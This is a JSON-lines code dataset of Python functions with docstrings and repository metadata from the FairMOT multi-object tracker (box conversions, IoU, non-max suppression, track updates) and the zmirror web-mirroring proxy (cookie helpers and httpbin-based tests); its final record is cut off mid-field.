{"docstring": "# Convert bounding box format from [x, y, w, h] to [x1, y1, x2, y2]\n", "func_signal": "def xywh2xyxy(x):\n", "code": "y = torch.zeros(x.shape) if x.dtype is torch.float32 else np.zeros(x.shape)\ny[:, 0] = (x[:, 0] - x[:, 2] / 2)\ny[:, 1] = (x[:, 1] - x[:, 3] / 2)\ny[:, 2] = (x[:, 0] + x[:, 2] / 2)\ny[:, 3] = (x[:, 1] + x[:, 3] / 2)\nreturn y", "path": "FairMOT/src/lib/tracking_utils/utils.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\"\nCompute cost based on IoU\n:type atlbrs: list[tlbr] | np.ndarray\n:type atlbrs: list[tlbr] | np.ndarray\n\n:rtype ious np.ndarray\n\"\"\"\n", "func_signal": "def ious(atlbrs, btlbrs):\n", "code": "ious = np.zeros((len(atlbrs), len(btlbrs)), dtype=np.float)\nif ious.size == 0:\n    return ious\n\nious = bbox_ious(\n    np.ascontiguousarray(atlbrs, dtype=np.float),\n    np.ascontiguousarray(btlbrs, dtype=np.float)\n)\n\nreturn ious", "path": "FairMOT/src/lib/tracker/matching.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\"\nreturns nT, nCorrect, tx, ty, tw, th, tconf, tcls\n\"\"\"\n", "func_signal": "def build_targets_max(target, anchor_wh, nA, nC, nGh, nGw):\n", "code": "nB = len(target)  # number of images in batch\n\ntxy = torch.zeros(nB, nA, nGh, nGw, 2).cuda()  # batch size, anchors, grid size\ntwh = torch.zeros(nB, nA, nGh, nGw, 2).cuda()\ntconf = torch.LongTensor(nB, nA, nGh, nGw).fill_(0).cuda()\ntcls = torch.ByteTensor(nB, nA, nGh, nGw, nC).fill_(0).cuda()  # nC = number of classes\ntid = torch.LongTensor(nB, nA, nGh, nGw, 1).fill_(-1).cuda() \nfor b in range(nB):\n    t = target[b]\n    t_id = t[:, 1].clone().long().cuda()\n    t = t[:,[0,2,3,4,5]]\n    nTb = len(t)  # number of targets\n    if nTb == 0:\n        continue\n\n    #gxy, gwh = t[:, 1:3] * nG, t[:, 3:5] * nG\n    gxy, gwh = t[: , 1:3].clone() , t[:, 3:5].clone()\n    gxy[:, 0] = gxy[:, 0] * nGw\n    gxy[:, 1] = gxy[:, 1] * nGh\n    gwh[:, 0] = gwh[:, 0] * nGw\n    gwh[:, 1] = gwh[:, 1] * nGh\n    gi = torch.clamp(gxy[:, 0], min=0, max=nGw -1).long()\n    gj = torch.clamp(gxy[:, 1], min=0, max=nGh -1).long()\n\n    # Get grid box indices and prevent overflows (i.e. 13.01 on 13 anchors)\n    #gi, gj = torch.clamp(gxy.long(), min=0, max=nG - 1).t()\n    #gi, gj = gxy.long().t()\n\n    # iou of targets-anchors (using wh only)\n    box1 = gwh\n    box2 = anchor_wh.unsqueeze(1)\n    inter_area = torch.min(box1, box2).prod(2)\n    iou = inter_area / (box1.prod(1) + box2.prod(2) - inter_area + 1e-16)\n\n    # Select best iou_pred and anchor\n    iou_best, a = iou.max(0)  # best anchor [0-2] for each target\n\n    # Select best unique target-anchor combinations\n    if nTb > 1:\n        _, iou_order = torch.sort(-iou_best)  # best to worst\n\n        # Unique anchor selection\n        u = torch.stack((gi, gj, a), 0)[:, iou_order]\n        # _, first_unique = np.unique(u, axis=1, return_index=True)  # first unique indices\n        first_unique = return_torch_unique_index(u, torch.unique(u, dim=1))  # torch alternative\n        i = iou_order[first_unique]\n        # best anchor must share significant commonality (iou) with target\n        i = i[iou_best[i] > 0.60]  # TODO: examine arbitrary threshold\n        if len(i) == 0:\n            continue\n\n        a, gj, gi, t = a[i], gj[i], gi[i], t[i]\n        t_id = t_id[i]\n        if len(t.shape) == 1:\n            t = t.view(1, 5)\n    else:\n        if iou_best < 0.60:\n            continue\n    \n    tc, gxy, gwh = t[:, 0].long(), t[:, 1:3].clone(), t[:, 3:5].clone()\n    gxy[:, 0] = gxy[:, 0] * nGw\n    gxy[:, 1] = gxy[:, 1] * nGh\n    gwh[:, 0] = gwh[:, 0] * nGw\n    gwh[:, 1] = gwh[:, 1] * nGh\n\n    # XY coordinates\n    txy[b, a, gj, gi] = gxy - gxy.floor()\n\n    # Width and height\n    twh[b, a, gj, gi] = torch.log(gwh / anchor_wh[a])  # yolo method\n    # twh[b, a, gj, gi] = torch.sqrt(gwh / anchor_wh[a]) / 2 # power method\n\n    # One-hot encoding of label\n    tcls[b, a, gj, gi, tc] = 1\n    tconf[b, a, gj, gi] = 1\n    tid[b, a, gj, gi] = t_id.unsqueeze(1)\ntbox = torch.cat([txy, twh], -1)\nreturn tconf, tbox, tid", "path": "FairMOT/src/lib/tracking_utils/utils.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "# Strip optimizer from *.pt files for lighter files (reduced by 2/3 size)\n\n", "func_signal": "def strip_optimizer_from_checkpoint(filename='weights/best.pt'):\n", "code": "a = torch.load(filename, map_location='cpu')\na['optimizer'] = []\ntorch.save(a, filename.replace('.pt', '_lite.pt'))", "path": "FairMOT/src/lib/tracking_utils/utils.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\"\n:param tracks: list[STrack]\n:param detections: list[BaseTrack]\n:param metric:\n:return: cost_matrix np.ndarray\n\"\"\"\n\n", "func_signal": "def embedding_distance(tracks, detections, metric='cosine'):\n", "code": "cost_matrix = np.zeros((len(tracks), len(detections)), dtype=np.float)\nif cost_matrix.size == 0:\n    return cost_matrix\ndet_features = np.asarray([track.curr_feat for track in detections], dtype=np.float)\n#for i, track in enumerate(tracks):\n    #cost_matrix[i, :] = np.maximum(0.0, cdist(track.smooth_feat.reshape(1,-1), det_features, metric))\ntrack_features = np.asarray([track.smooth_feat for track in tracks], dtype=np.float)\ncost_matrix = np.maximum(0.0, cdist(track_features, det_features, metric))  # Nomalized features\nreturn cost_matrix", "path": "FairMOT/src/lib/tracker/matching.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\"Start a new tracklet\"\"\"\n", "func_signal": "def activate(self, kalman_filter, frame_id):\n", "code": "self.kalman_filter = kalman_filter\nself.track_id = self.next_id()\nself.mean, self.covariance = self.kalman_filter.initiate(self.tlwh_to_xyah(self._tlwh))\n\nself.tracklet_len = 0\nself.state = TrackState.Tracked\nif frame_id == 1:\n    self.is_activated = True\n#self.is_activated = True\nself.frame_id = frame_id\nself.start_frame = frame_id", "path": "FairMOT/src/lib/tracker/multitracker.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "# Convert bounding box format from [x1, y1, x2, y2] to [x, y, w, h]\n", "func_signal": "def xyxy2xywh(x):\n", "code": "y = torch.zeros(x.shape) if x.dtype is torch.float32 else np.zeros(x.shape)\ny[:, 0] = (x[:, 0] + x[:, 2]) / 2\ny[:, 1] = (x[:, 1] + x[:, 3]) / 2\ny[:, 2] = x[:, 2] - x[:, 0]\ny[:, 3] = x[:, 3] - x[:, 1]\nreturn y", "path": "FairMOT/src/lib/tracking_utils/utils.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\"\nLoads class labels at 'path'\n\"\"\"\n", "func_signal": "def load_classes(path):\n", "code": "fp = open(path, 'r')\nnames = fp.read().split('\\n')\nreturn list(filter(None, names))  # filter removes empty strings (such as last line)", "path": "FairMOT/src/lib/tracking_utils/utils.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\"\nRemoves detections with lower object confidence score than 'conf_thres'\nNon-Maximum Suppression to further filter detections.\nReturns detections with shape:\n    (x1, y1, x2, y2, object_conf, class_score, class_pred)\n\"\"\"\n\n", "func_signal": "def non_max_suppression(prediction, conf_thres=0.5, nms_thres=0.2):\n", "code": "output = [None for _ in range(len(prediction))]\nfor image_i, pred in enumerate(prediction):\n    # Filter out confidence scores below threshold\n    # Get score and class with highest confidence\n\n    v = pred[:, 4] > conf_thres\n    v = v.nonzero().squeeze()\n    if len(v.shape) == 0:\n        v = v.unsqueeze(0)\n\n    pred = pred[v]\n\n    # If none are remaining => process next image\n    nP = pred.shape[0]\n    if not nP:\n        continue\n    # From (center x, center y, width, height) to (x1, y1, x2, y2)\n    pred[:, :4] = xywh2xyxy(pred[:, :4])\n    nms_indices = nms(pred[:, :4], pred[:, 4], nms_thres)\n    det_max = pred[nms_indices]        \n\n    if len(det_max) > 0:\n        # Add max detections to outputs\n        output[image_i] = det_max if output[image_i] is None else torch.cat((output[image_i], det_max))\n\nreturn output", "path": "FairMOT/src/lib/tracking_utils/utils.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\"\nReturns the IoU of two bounding boxes\n\"\"\"\n", "func_signal": "def bbox_iou(box1, box2, x1y1x2y2=False):\n", "code": "N, M = len(box1), len(box2)\nif x1y1x2y2:\n    # Get the coordinates of bounding boxes\n    b1_x1, b1_y1, b1_x2, b1_y2 = box1[:, 0], box1[:, 1], box1[:, 2], box1[:, 3]\n    b2_x1, b2_y1, b2_x2, b2_y2 = box2[:, 0], box2[:, 1], box2[:, 2], box2[:, 3]\nelse:\n    # Transform from center and width to exact coordinates\n    b1_x1, b1_x2 = box1[:, 0] - box1[:, 2] / 2, box1[:, 0] + box1[:, 2] / 2\n    b1_y1, b1_y2 = box1[:, 1] - box1[:, 3] / 2, box1[:, 1] + box1[:, 3] / 2\n    b2_x1, b2_x2 = box2[:, 0] - box2[:, 2] / 2, box2[:, 0] + box2[:, 2] / 2\n    b2_y1, b2_y2 = box2[:, 1] - box2[:, 3] / 2, box2[:, 1] + box2[:, 3] / 2\n\n# get the coordinates of the intersection rectangle\ninter_rect_x1 = torch.max(b1_x1.unsqueeze(1), b2_x1)\ninter_rect_y1 = torch.max(b1_y1.unsqueeze(1), b2_y1)\ninter_rect_x2 = torch.min(b1_x2.unsqueeze(1), b2_x2)\ninter_rect_y2 = torch.min(b1_y2.unsqueeze(1), b2_y2)\n# Intersection area\ninter_area = torch.clamp(inter_rect_x2 - inter_rect_x1, 0) * torch.clamp(inter_rect_y2 - inter_rect_y1, 0)\n# Union Area\nb1_area = ((b1_x2 - b1_x1) * (b1_y2 - b1_y1))\nb1_area = ((b1_x2 - b1_x1) * (b1_y2 - b1_y1)).view(-1,1).expand(N,M)\nb2_area = ((b2_x2 - b2_x1) * (b2_y2 - b2_y1)).view(1,-1).expand(N,M)\n\nreturn inter_area / (b1_area + b2_area - inter_area + 1e-16)", "path": "FairMOT/src/lib/tracking_utils/utils.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\" Compute the average precision, given the recall and precision curves.\nCode originally from https://github.com/rbgirshick/py-faster-rcnn.\n# Arguments\n    recall:    The recall curve (list).\n    precision: The precision curve (list).\n# Returns\n    The average precision as computed in py-faster-rcnn.\n\"\"\"\n# correct AP calculation\n# first append sentinel values at the end\n\n", "func_signal": "def compute_ap(recall, precision):\n", "code": "mrec = np.concatenate(([0.], recall, [1.]))\nmpre = np.concatenate(([0.], precision, [0.]))\n\n# compute the precision envelope\nfor i in range(mpre.size - 1, 0, -1):\n    mpre[i - 1] = np.maximum(mpre[i - 1], mpre[i])\n\n# to calculate area under PR curve, look for points\n# where X axis (recall) changes value\ni = np.where(mrec[1:] != mrec[:-1])[0]\n\n# and sum (\\Delta recall) * prec\nap = np.sum((mrec[i + 1] - mrec[i]) * mpre[i + 1])\nreturn ap", "path": "FairMOT/src/lib/tracking_utils/utils.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\"Convert bounding box to format `(center x, center y, aspect ratio,\nheight)`, where the aspect ratio is `width / height`.\n\"\"\"\n", "func_signal": "def tlwh_to_xyah(tlwh):\n", "code": "ret = np.asarray(tlwh).copy()\nret[:2] += ret[2:] / 2\nret[2] /= ret[3]\nreturn ret", "path": "FairMOT/src/lib/tracker/multitracker.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\"\nCompute cost based on IoU\n:type atracks: list[STrack]\n:type btracks: list[STrack]\n\n:rtype cost_matrix np.ndarray\n\"\"\"\n\n", "func_signal": "def iou_distance(atracks, btracks):\n", "code": "if (len(atracks)>0 and isinstance(atracks[0], np.ndarray)) or (len(btracks) > 0 and isinstance(btracks[0], np.ndarray)):\n    atlbrs = atracks\n    btlbrs = btracks\nelse:\n    atlbrs = [track.tlbr for track in atracks]\n    btlbrs = [track.tlbr for track in btracks]\n_ious = ious(atlbrs, btlbrs)\ncost_matrix = 1 - _ious\n\nreturn cost_matrix", "path": "FairMOT/src/lib/tracker/matching.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "# Plot YOLO training results file 'results.txt'\n# import os; os.system('wget https://storage.googleapis.com/ultralytics/yolov3/results_v1.txt')\n\n", "func_signal": "def plot_results():\n", "code": "plt.figure(figsize=(14, 7))\ns = ['X + Y', 'Width + Height', 'Confidence', 'Classification', 'Total Loss', 'mAP', 'Recall', 'Precision']\nfiles = sorted(glob.glob('results*.txt'))\nfor f in files:\n    results = np.loadtxt(f, usecols=[2, 3, 4, 5, 6, 9, 10, 11]).T  # column 11 is mAP\n    x = range(1, results.shape[1])\n    for i in range(8):\n        plt.subplot(2, 4, i + 1)\n        plt.plot(x, results[i, x], marker='.', label=f)\n        plt.title(s[i])\n        if i == 0:\n            plt.legend()", "path": "FairMOT/src/lib/tracking_utils/utils.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\"\nUpdate a matched track\n:type new_track: STrack\n:type frame_id: int\n:type update_feature: bool\n:return:\n\"\"\"\n", "func_signal": "def update(self, new_track, frame_id, update_feature=True):\n", "code": "self.frame_id = frame_id\nself.tracklet_len += 1\n\nnew_tlwh = new_track.tlwh\nself.mean, self.covariance = self.kalman_filter.update(\n    self.mean, self.covariance, self.tlwh_to_xyah(new_tlwh))\nself.state = TrackState.Tracked\nself.is_activated = True\n\nself.score = new_track.score\nif update_feature:\n    self.update_features(new_track.curr_feat)", "path": "FairMOT/src/lib/tracker/multitracker.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "'''\n:param: delta_map, shape (nB, nA, nGh, nGw, 4)\n:param: anchors, shape (nA,4)\n'''\n", "func_signal": "def decode_delta_map(delta_map, anchors):\n", "code": "nB, nA, nGh, nGw, _ = delta_map.shape\nanchor_mesh = generate_anchor(nGh, nGw, anchors) \nanchor_mesh = anchor_mesh.permute(0,2,3,1).contiguous()              # Shpae (nA x nGh x nGw) x 4\nanchor_mesh = anchor_mesh.unsqueeze(0).repeat(nB,1,1,1,1)\npred_list = decode_delta(delta_map.view(-1,4), anchor_mesh.view(-1,4))\npred_map = pred_list.view(nB, nA, nGh, nGw, 4)\nreturn pred_map", "path": "FairMOT/src/lib/tracking_utils/utils.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "# Rescale x1, y1, x2, y2 from 416 to image size\n", "func_signal": "def scale_coords(img_size, coords, img0_shape):\n", "code": "gain_w = float(img_size[0]) / img0_shape[1]  # gain  = old / new\ngain_h = float(img_size[1]) / img0_shape[0]\ngain = min(gain_w, gain_h)\npad_x = (img_size[0] - img0_shape[1] * gain) / 2  # width padding\npad_y = (img_size[1] - img0_shape[0] * gain) / 2  # height padding\ncoords[:, [0, 2]] -= pad_x\ncoords[:, [1, 3]] -= pad_y\ncoords[:, 0:4] /= gain\ncoords[:, :4] = torch.clamp(coords[:, :4], min=0)\nreturn coords", "path": "FairMOT/src/lib/tracking_utils/utils.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\" Compute the average precision, given the recall and precision curves.\nMethod originally from https://github.com/rafaelpadilla/Object-Detection-Metrics.\n# Arguments\n    tp:    True positives (list).\n    conf:  Objectness value from 0-1 (list).\n    pred_cls: Predicted object classes (list).\n    target_cls: True object classes (list).\n# Returns\n    The average precision as computed in py-faster-rcnn.\n\"\"\"\n\n# lists/pytorch to numpy\n", "func_signal": "def ap_per_class(tp, conf, pred_cls, target_cls):\n", "code": "tp, conf, pred_cls, target_cls = np.array(tp), np.array(conf), np.array(pred_cls), np.array(target_cls)\n\n# Sort by objectness\ni = np.argsort(-conf)\ntp, conf, pred_cls = tp[i], conf[i], pred_cls[i]\n\n# Find unique classes\nunique_classes = np.unique(np.concatenate((pred_cls, target_cls), 0))\n\n# Create Precision-Recall curve and compute AP for each class\nap, p, r = [], [], []\nfor c in unique_classes:\n    i = pred_cls == c\n    n_gt = sum(target_cls == c)  # Number of ground truth objects\n    n_p = sum(i)  # Number of predicted objects\n\n    if (n_p == 0) and (n_gt == 0):\n        continue\n    elif (n_p == 0) or (n_gt == 0):\n        ap.append(0)\n        r.append(0)\n        p.append(0)\n    else:\n        # Accumulate FPs and TPs\n        fpc = np.cumsum(1 - tp[i])\n        tpc = np.cumsum(tp[i])\n\n        # Recall\n        recall_curve = tpc / (n_gt + 1e-16)\n        r.append(tpc[-1] / (n_gt + 1e-16))\n\n        # Precision\n        precision_curve = tpc / (tpc + fpc)\n        p.append(tpc[-1] / (tpc[-1] + fpc[-1]))\n\n        # AP from recall-precision curve\n        ap.append(compute_ap(recall_curve, precision_curve))\n\nreturn np.array(ap), unique_classes.astype('int32'), np.array(r), np.array(p)", "path": "FairMOT/src/lib/tracking_utils/utils.py", "commit_date": "2020-09-11 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\"Convert bounding box to format `(min x, min y, max x, max y)`, i.e.,\n`(top left, bottom right)`.\n\"\"\"\n", "func_signal": "def tlbr(self):\n", "code": "ret = self.tlwh.copy()\nret[2:] += ret[:2]\nreturn ret", "path": "FairMOT/src/lib/tracker/multitracker.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\"Get current position in bounding box format `(top left x, top left y,\n        width, height)`.\n\"\"\"\n", "func_signal": "def tlwh(self):\n", "code": "if self.mean is None:\n    return self._tlwh.copy()\nret = self.mean[:4].copy()\nret[2] *= ret[3]\nret[:2] -= ret[2:] / 2\nreturn ret", "path": "FairMOT/src/lib/tracker/multitracker.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "ifzhang/FairMOT", "stars": 3902, "license": "mit", "language": "python", "size": 64887}
{"docstring": "\"\"\"\n:type timestring: Union[str, int]\n:rtype: Union[int, None]\n\"\"\"\n", "func_signal": "def _time_str_to_unix(timestring):\n", "code": "if isinstance(timestring, (int, float)):\n    return timestring\ntry:\n    t = int(time.mktime(datetime.strptime(timestring, '%a, %d %b %Y %H:%M:%S %Z').timetuple()))\nexcept:\n    t = None\nreturn t", "path": "zmirror/zmirror/cache_system.py", "commit_date": "2016-09-18 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"\n:param ttl: cookie\u6709\u6548\u65f6\u95f4, \u79d2\n:type ttl: int\n:type path: str\n:type name:  str\n:type value:  str\n\"\"\"\n", "func_signal": "def set_cookies(self, name, value, ttl=12 * 35 * 24 * 60 * 60, path='/'):\n", "code": "from http.cookies import SimpleCookie\nc = SimpleCookie()\nc[name] = value\nc[name][\"path\"] = path\nc[name][\"expires\"] = ttl\n\nself.extra_cookies[name] = c[name].OutputString()", "path": "zmirror/zmirror/threadlocal.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"https://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F\"\"\"\n", "func_signal": "def test_relative_redirect_to_2(self):\n", "code": "self.rv = self.client.get(\n    self.url(\"/redirect-to\"),\n    query_string=\"url=http%3A%2F%2Feu.httpbin.org%2F\",\n    environ_base=env(),\n    headers=headers(),\n)  # type: Response\nself.assertEqual(self.url(\"/extdomains/eu.httpbin.org/\"), self.rv.location, msg=self.dump())", "path": "zmirror/tests/test_custom_response_text_rewrite.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"https://httpbin.org/\"\"\"\n", "func_signal": "def test__enable_keep_alive_per_domain(self):\n", "code": "self.reload_zmirror({\"enable_keep_alive_per_domain\": True})\n\nself.rv = self.client.get(\n    self.url(\"/\"),\n    environ_base=env(),\n    headers=headers(),\n)  # type: Response\nself.assertIn(b'httpbin', self.rv.data, msg=self.dump())", "path": "zmirror/tests/test_httpbin.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"https://httpbin.org/\"\"\"\n\n", "func_signal": "def test_homepage(self):\n", "code": "self.rv = self.client.get(\n    self.url(\"/\"),\n    environ_base=env(),\n    headers=headers(),\n)  # type: Response\nself.assertIn(b'httpbin', self.rv.data, msg=self.dump())", "path": "zmirror/tests/test_httpbin.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"https://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F\"\"\"\n", "func_signal": "def test_relative_redirect_to(self):\n", "code": "self.rv = self.client.get(\n    self.url(\"/redirect-to\"),\n    query_string=\"url=http%3A%2F%2Fexample.com%2F\",\n    environ_base=env(),\n    headers=headers(),\n)  # type: Response\n\nself.assertIn(\"example.com\", self.rv.location, msg=self.dump())", "path": "zmirror/tests/test_custom_response_text_rewrite.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"https://httpbin.org/cookies/set?name=value\"\"\"\n", "func_signal": "def test_remote_set_cookie(self):\n", "code": "self.rv = self.client.get(\n    self.url(\"/cookies/set?k1=value1&k2=value2\"),\n    environ_base=env(),\n    headers=headers(),\n)  # type: Response\n\nself.assertEqual(2, len(self.rv.headers.get_all(\"Set-Cookie\")), msg=self.dump())\nfor set_cookie_header in self.rv.headers.get_all(\"Set-Cookie\"):\n    if not (\"k1=value1\" in set_cookie_header\n            or \"k2=value2\" in set_cookie_header):\n        raise ValueError(\"cookie set error\" + self.dump())\nself.assertEqual(302, self.rv.status_code, msg=self.dump())", "path": "zmirror/tests/test_httpbin.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 1838}
{"docstring": "\"\"\"POST https://httpbin.org/post\"\"\"\n\n", "func_signal": "def test_post_json(self):\n", "code": "with self.app.test_client() as c:\n    req_json = {\n        \"x\": 233,\n        \"domain1\": self.C.my_host_name,\n        \"domain2\": self.C.external_domains[0],\n        \"url1\": \"https://eu.httpbin.org/\",\n        \"url2\": self.url(\"/post\"),\n        \"url3\": \"https://%s/extdomains/eu.httpbin.org/1xxx?a=235\" % self.C.my_host_name,\n        \"url4\": \"//%s/extdomains/eu.httpbin.org/2xxx?a=236\" % self.C.my_host_name,\n        \"url5\": \"http://%s/extdomains/eu.httpbin.org/3xxx?a=237\" % self.C.my_host_name,\n        \"url6\": \"http://%s/extdomains/httpbin.org/4xxx.png?a=238\" % self.C.my_host_name,\n\n        \"chinese\": \"\u5431\u5431\u6211\u7231\u4f60~ :)\",\n    }\n    for u in range(1, 7):\n        req_json[\"url%dq\" % u] = quote_plus(req_json[\"url%d\" % u])\n        req_json[\"url%de\" % u] = slash_esc(req_json[\"url%d\" % u])\n        req_json[\"url%deq\" % u] = quote_plus(req_json[\"url%de\" % u])\n\n    self.rv = c.post(\n        self.url(\"/post\"),\n        environ_base=env(),\n        content_type=\"application/json\",\n        data=json.dumps(req_json),\n        headers=headers(\n            others={\n                \"Accept\": \"application/json\",\n            }\n        ),\n    )  # type: Response\n\n    # \u767d\u76d2\u68c0\u67e5\n    parse_values = attributes(self.zmirror.parse)\n    remote_resp = self.zmirror.parse.remote_response  # type: requests.Response\n    remote_resp_json = json.loads(remote_resp.text)  # type: dict\n    zmirror_req = remote_resp.request  # type: requests.PreparedRequest\n\n    self.assertEqual(\n        \"application/json\",\n        self.zmirror.parse.client_header['content-type'],\n        msg=self.dump()\n    )\n\n    # print(parse_values)\n    # print(\"---------- zmirror_req.headers --------\")\n    # pprint(zmirror_req.headers)\n    # print(\"---------- zmirror_req.body --------\")\n    req_body = json.loads(zmirror_req.body.decode(encoding='utf-8'))  # type: dict\n    # pprint(json.loads(zmirror_req.body.decode()))\n\n    self.assertEqual(\"\u5431\u5431\u6211\u7231\u4f60~ :)\", req_body['chinese'], msg=self.dump())\n    self.assertEqual(self.C.target_domain, req_body['domain1'], msg=self.dump())\n    self.assertEqual(self.C.external_domains[0], req_body['domain2'], msg=self.dump())\n\n    self.assertEqual(\"https://eu.httpbin.org/\", req_body['url1'], msg=self.dump())\n    self.assertEqual(\"https://httpbin.org/post\", req_body['url2'], msg=self.dump())\n    self.assertEqual(\"https://eu.httpbin.org/1xxx?a=235\", req_body['url3'], msg=self.dump())\n    self.assertEqual(\"//eu.httpbin.org/2xxx?a=236\", req_body['url4'], msg=self.dump())\n    self.assertEqual(\"https://eu.httpbin.org/3xxx?a=237\", req_body['url5'], msg=self.dump())\n    self.assertEqual(\"https://httpbin.org/4xxx.png?a=238\", req_body['url6'], msg=self.dump())\n\n    # print(\"---------- remote_resp_json --------\")\n    # pprint(remote_resp_json)\n    j = remote_resp_json['json']\n    self.assertEqual(\"\u5431\u5431\u6211\u7231\u4f60~ :)\", j['chinese'], msg=self.dump())\n    self.assertEqual(self.C.target_domain, j['domain1'], msg=self.dump())\n    self.assertEqual(self.C.external_domains[0], j['domain2'], msg=self.dump())\n\n    self.assertEqual(\"https://eu.httpbin.org/\", j['url1'], msg=self.dump())\n    self.assertEqual(\"https://httpbin.org/post\", j['url2'], msg=self.dump())\n    self.assertEqual(\"https://eu.httpbin.org/1xxx?a=235\", j['url3'], msg=self.dump())\n    self.assertEqual(\"//eu.httpbin.org/2xxx?a=236\", j['url4'], msg=self.dump())\n    self.assertEqual(\"https://eu.httpbin.org/3xxx?a=237\", j['url5'], msg=self.dump())\n    self.assertEqual(\"https://httpbin.org/4xxx.png?a=238\", j['url6'], msg=self.dump())\n\n    # \u9ed1\u76d2\u68c0\u67e5\n    # print(\"---------- r-data --------\")\n    # print(self.rv.data.decode())\n    r = load_rv_json(self.rv)\n    # print(\"---------- r --------\")\n    # pprint(r)\n    r_json = r['json']\n    self.assertEqual(\"application/json\", r[\"headers\"]['Content-Type'], msg=self.dump())\n    self.assertEqual(self.C.my_host_name, r[\"headers\"]['Host'], msg=self.dump())\n\n    self.assertEqual(233, r_json['x'], msg=self.dump())\n    self.assertEqual(\"\u5431\u5431\u6211\u7231\u4f60~ :)\", r_json['chinese'], msg=self.dump())\n\n    self.assertEqual(self.C.my_host_name, r_json['domain1'], msg=self.dump())\n    self.assertEqual(self.C.my_host_name + '/extdomains/' + self.C.external_domains[0], r_json['domain2'],\n                     msg=self.dump())\n\n    self.zmirror.dump_zmirror_snapshot()\n\n    # \u672a\u52a0\u5904\u7406\u7684url, \u6807\u51c6\u7b54\u6848\n    answers = [\n        None,\n        self.url(\"/extdomains/eu.httpbin.org/\"),\n        self.url(\"/post\"),\n        self.url(\"/extdomains/eu.httpbin.org/1xxx?a=235\"),\n        \"//{}/extdomains/eu.httpbin.org/2xxx?a=236\".format(self.C.my_host_name),\n        self.url(\"/extdomains/eu.httpbin.org/3xxx?a=237\"),\n        self.url(\"/4xxx.png?a=238\"),\n    ]\n    for i in range(1, 7):\n        # \u672a\u52a0\u5904\u7406\u7684url\n        self.assertEqual(answers[i], r_json['url{}'.format(i)], msg=self.dump())\n        # slash_escape \u540e\u7684 url\n        self.assertEqual(slash_esc(answers[i]), r_json['url{}e'.format(i)], msg=self.dump())\n        # quote_plus \u540e\u7684 url\n        self.assertEqual(quote_plus(answers[i]), r_json['url{}q'.format(i)], msg=self.dump())\n        # \u5148 slash_escape \u518d quote_plus \u540e\u7684 url\n        self.assertEqual(quote_plus(slash_esc(answers[i])), r_json['url{}eq'.format(i)], msg=self.dump())", "path": "zmirror/tests/test_httpbin.py", "commit_date": "2016-10-08 00:00:00", "repo_name": "aploium/zmirror", "stars": 2383, "license": "mit", "language": "python", "size": 